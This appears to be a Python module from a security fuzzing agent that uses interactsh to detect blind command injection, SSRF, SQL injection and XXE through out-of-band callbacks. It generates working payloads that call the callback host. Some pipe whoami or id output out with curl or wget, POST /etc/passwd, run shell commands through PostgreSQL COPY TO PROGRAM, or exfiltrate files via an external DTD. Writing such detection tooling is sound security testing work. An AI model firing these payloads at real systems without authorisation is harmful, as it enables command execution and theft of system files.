"""
agents/fuzzer/oob_server.py — Out-of-Band (OOB) Detection via Interactsh

Integrates with ProjectDiscovery's interactsh-client CLI to detect blind
vulnerabilities that produce no visible response:
  - Blind SQLi (OOB via xp_dirtree, UTL_HTTP, etc.)
  - Blind SSRF (server makes outbound request) 
  - Blind XXE (external entity fetches attacker-controlled URL)
  - Blind Command Injection (curl/wget/nslookup to callback)

Architecture:
  1. Start interactsh-client as a subprocess with -json output
  2. Generate unique OOB URLs per payload (correlation tokens)
  3. Inject OOB URLs into blind payloads
  4. After fuzzing, check if any callbacks arrived
  5. Correlate callbacks to specific payloads → confirmed blind vuln

Requirements:
  - interactsh-client must be installed and on PATH
  - Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
"""

from __future__ import annotations

import asyncio
import json
import subprocess
import threading
import time
import uuid
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

from rich.console import Console

console = Console()


class OOBDetector:
    """Manages interactsh-client for blind vulnerability detection."""

    def __init__(self, config=None):
        self.config = config
        self._process: Optional[subprocess.Popen] = None
        self._interactions: List[Dict] = []
        self._correlation_map: Dict[str, Dict] = {}  # token → payload info
        self._oob_domain: str = ""
        self._reader_thread: Optional[threading.Thread] = None
        self._running = False
        self._lock = threading.Lock()

    @property
    def is_available(self) -> bool:
        """Check if interactsh-client is installed."""
        try:
            result = subprocess.run(
                ["interactsh-client", "-version"],
                capture_output=True, text=True, timeout=5
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    async def start(self) -> bool:
        """Start the interactsh-client process and capture the OOB domain.
        
        Returns True if started successfully.
        """
        if not self.is_available:
            console.print("[yellow]  interactsh-client not found. Install with:[/yellow]")
            console.print("[cyan]  go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest[/cyan]")
            return False

        try:
            self._process = subprocess.Popen(
                [
                    "interactsh-client",
                    "-json",
                    "-poll-interval", "2",
                    "-n", "1",  # 1 unique payload domain
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
            )

            self._running = True

            # Read the first few lines to capture the OOB domain
            # The client prints the domain before starting to poll
            domain_captured = False
            start_time = time.time()

            while time.time() - start_time < 10:
                line = self._process.stderr.readline()
                if not line:
                    await asyncio.sleep(0.1)
                    continue

                line = line.strip()
                # interactsh prints the URL to stderr
                if ".oast." in line or ".interact." in line or "interactsh" in line.lower():
                    # Extract the domain from the output
                    for word in line.split():
                        if ".oast." in word or ".interact." in word:
                            self._oob_domain = word.strip("[]()\"'")
                            domain_captured = True
                            break

                if domain_captured:
                    break

            if not self._oob_domain:
                # Try reading from stdout as well
                line = self._process.stdout.readline().strip()
                if line:
                    try:
                        data = json.loads(line)
                        self._oob_domain = data.get("unique-id", "")
                    except json.JSONDecodeError:
                        for word in line.split():
                            if "." in word and len(word) > 10:
                                self._oob_domain = word
                                break

            if not self._oob_domain:
                console.print("[red]  Failed to capture OOB domain from interactsh[/red]")
                self.stop()
                return False

            console.print(f"  [green]✓ OOB Detection active: {self._oob_domain}[/green]")

            # Start background reader thread
            self._reader_thread = threading.Thread(
                target=self._read_interactions, daemon=True
            )
            self._reader_thread.start()

            return True

        except Exception as e:
            console.print(f"[red]  Failed to start interactsh: {e}[/red]")
            return False

    def _read_interactions(self):
        """Background thread: read JSON lines from interactsh stdout."""
        while self._running and self._process and self._process.poll() is None:
            try:
                line = self._process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue

                line = line.strip()
                if not line:
                    continue

                try:
                    data = json.loads(line)
                    with self._lock:
                        self._interactions.append(data)
                        uid = data.get("unique-id", "")
                        protocol = data.get("protocol", "unknown")
                        remote = data.get("remote-address", "unknown")
                        console.print(
                            f"  [bold green]🔔 OOB Callback![/bold green] "
                            f"Protocol: {protocol} | From: {remote} | ID: {uid[:20]}"
                        )
                except json.JSONDecodeError:
                    continue

            except Exception:
                break

    def generate_oob_url(self, payload_id: str = "") -> Tuple[str, str]:
        """Generate a unique OOB URL for a specific payload.
        
        Args:
            payload_id: Optional identifier for correlation
            
        Returns:
            (oob_url, correlation_token)
        """
        token = payload_id or uuid.uuid4().hex[:12]
        # Subdomain format: <token>.<oob_domain>
        oob_url = f"http://{token}.{self._oob_domain}"
        return oob_url, token

    def register_payload(
        self, token: str, vuln_type: str, endpoint: str, 
        param: str, payload: str
    ) -> None:
        """Register a payload for later correlation with OOB callbacks."""
        self._correlation_map[token] = {
            "vuln_type": vuln_type,
            "endpoint": endpoint,
            "param": param,
            "payload": payload,
            "timestamp": time.time(),
        }

    def generate_blind_payloads(
        self, vuln_type: str, endpoint: str, param: str
    ) -> List[Dict]:
        """Generate blind payloads with OOB callbacks for a specific vuln type.
        
        Returns list of {payload, token, technique} dicts.
        """
        if not self._oob_domain:
            return []

        payloads = []

        if vuln_type in ("command_injection", "cmd_injection", "rce"):
            payloads.extend(self._blind_cmdi_payloads(endpoint, param))
        
        if vuln_type in ("ssrf", "server-side request forgery"):
            payloads.extend(self._blind_ssrf_payloads(endpoint, param))
        
        if vuln_type in ("sql_injection", "sqli"):
            payloads.extend(self._blind_sqli_payloads(endpoint, param))
        
        if vuln_type in ("xxe", "xml external entity"):
            payloads.extend(self._blind_xxe_payloads(endpoint, param))

        return payloads

    def _blind_cmdi_payloads(self, endpoint: str, param: str) -> List[Dict]:
        """Generate blind command injection payloads with OOB callbacks."""
        payloads = []
        techniques = [
            ("curl_pipe", lambda url: f"; curl {url}/$(whoami)"),
            ("wget_bg", lambda url: f"; wget -q {url}/$(id) &"),
            ("nslookup", lambda url: f"; nslookup {url.replace('http://', '')}"),
            ("ping", lambda url: f"; ping -c 1 {url.replace('http://', '')}"),
            ("curl_post", lambda url: f"| curl -X POST -d @/etc/passwd {url}"),
            ("backtick_curl", lambda url: f"`curl {url}/$(whoami)`"),
            ("subshell_curl", lambda url: f"$(curl {url}/rce-confirmed)"),
        ]
        
        for technique_name, generator in techniques:
            oob_url, token = self.generate_oob_url(f"cmdi-{technique_name[:6]}")
            payload_str = generator(oob_url)
            
            self.register_payload(token, "command_injection", endpoint, param, payload_str)
            payloads.append({
                "payload": payload_str,
                "token": token,
                "technique": f"blind_cmdi_{technique_name}",
                "oob_url": oob_url,
            })
        
        return payloads

    def _blind_ssrf_payloads(self, endpoint: str, param: str) -> List[Dict]:
        """Generate blind SSRF payloads with OOB callbacks."""
        payloads = []
        techniques = [
            ("http_direct", lambda url: url),
            ("https_direct", lambda url: url.replace("http://", "https://")),
            ("dns_only", lambda url: url.replace("http://", "").split("/")[0]),
            ("url_redirect", lambda url: f"http://127.0.0.1@{url.replace('http://', '')}"),
        ]
        
        for technique_name, generator in techniques:
            oob_url, token = self.generate_oob_url(f"ssrf-{technique_name[:6]}")
            payload_str = generator(oob_url)
            
            self.register_payload(token, "ssrf", endpoint, param, payload_str)
            payloads.append({
                "payload": payload_str,
                "token": token,
                "technique": f"blind_ssrf_{technique_name}",
                "oob_url": oob_url,
            })
        
        return payloads

    def _blind_sqli_payloads(self, endpoint: str, param: str) -> List[Dict]:
        """Generate blind OOB SQL injection payloads."""
        payloads = []
        
        for technique_name, generator in [
            # MSSQL
            ("mssql_xp_dirtree", 
             lambda url: f"'; EXEC master..xp_dirtree '\\\\{url.replace('http://', '')}\\test'--"),
            ("mssql_openrowset",
             lambda url: f"'; SELECT * FROM OPENROWSET('SQLOLEDB','{url.replace('http://', '')}';'sa';'','SELECT 1')--"),
            # Oracle
            ("oracle_utl_http",
             lambda url: f"' UNION SELECT UTL_HTTP.REQUEST('{url}') FROM DUAL--"),
            # PostgreSQL
            ("pg_copy",
             lambda url: f"'; COPY (SELECT '') TO PROGRAM 'curl {url}'--"),
            # MySQL
            ("mysql_load",
             lambda url: f"' UNION SELECT LOAD_FILE('{url}')--"),
        ]:
            oob_url, token = self.generate_oob_url(f"sqli-{technique_name[:6]}")
            payload_str = generator(oob_url)
            
            self.register_payload(token, "sql_injection", endpoint, param, payload_str)
            payloads.append({
                "payload": payload_str,
                "token": token,
                "technique": f"blind_sqli_{technique_name}",
                "oob_url": oob_url,
            })
        
        return payloads

    def _blind_xxe_payloads(self, endpoint: str, param: str) -> List[Dict]:
        """Generate blind XXE payloads with external entity callbacks."""
        payloads = []
        
        for technique_name, generator in [
            ("basic_entity",
             lambda url: f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]><root>&xxe;</root>'),
            ("param_entity",
             lambda url: f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}"> %xxe;]><root></root>'),
            ("data_exfil",
             lambda url: f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "{url}/evil.dtd"> %dtd;]><root></root>'),
        ]:
            oob_url, token = self.generate_oob_url(f"xxe-{technique_name[:6]}")
            payload_str = generator(oob_url)
            
            self.register_payload(token, "xxe", endpoint, param, payload_str)
            payloads.append({
                "payload": payload_str,
                "token": token,
                "technique": f"blind_xxe_{technique_name}",
                "oob_url": oob_url,
            })
        
        return payloads

    async def check_callbacks(self, wait_seconds: int = 5) -> List[Dict]:
        """Wait for OOB callbacks and correlate with registered payloads.
        
        Returns list of confirmed blind findings.
        """
        console.print(f"  [dim]Waiting {wait_seconds}s for OOB callbacks...[/dim]")
        await asyncio.sleep(wait_seconds)

        confirmed = []
        
        with self._lock:
            for interaction in self._interactions:
                uid = interaction.get("unique-id", "")
                protocol = interaction.get("protocol", "")
                remote = interaction.get("remote-address", "")
                raw_request = interaction.get("raw-request", "")
                
                # Try to correlate with registered payloads
                for token, info in self._correlation_map.items():
                    if token in uid or token in raw_request:
                        confirmed.append({
                            "vuln_type": info["vuln_type"],
                            "endpoint": info["endpoint"],
                            "param": info["param"],
                            "payload": info["payload"],
                            "protocol": protocol,
                            "remote_address": remote,
                            "raw_request": raw_request[:500],
                            "token": token,
                            "confirmed": True,
                        })
                        console.print(
                            f"  [bold green]✓ BLIND {info['vuln_type'].upper()} CONFIRMED![/bold green] "
                            f"Endpoint: {info['endpoint']} | Param: {info['param']} | "
                            f"Callback from: {remote} via {protocol}"
                        )
                        break

            # Clear processed interactions
            self._interactions.clear()

        return confirmed

    def stop(self):
        """Stop the interactsh-client process."""
        self._running = False
        if self._process:
            try:
                self._process.terminate()
                self._process.wait(timeout=5)
            except Exception:
                try:
                    self._process.kill()
                except Exception:
                    pass
            self._process = None
        
        if self._reader_thread and self._reader_thread.is_alive():
            self._reader_thread.join(timeout=2)

        console.print("  [dim]OOB detector stopped[/dim]")

    def __del__(self):
        self.stop()
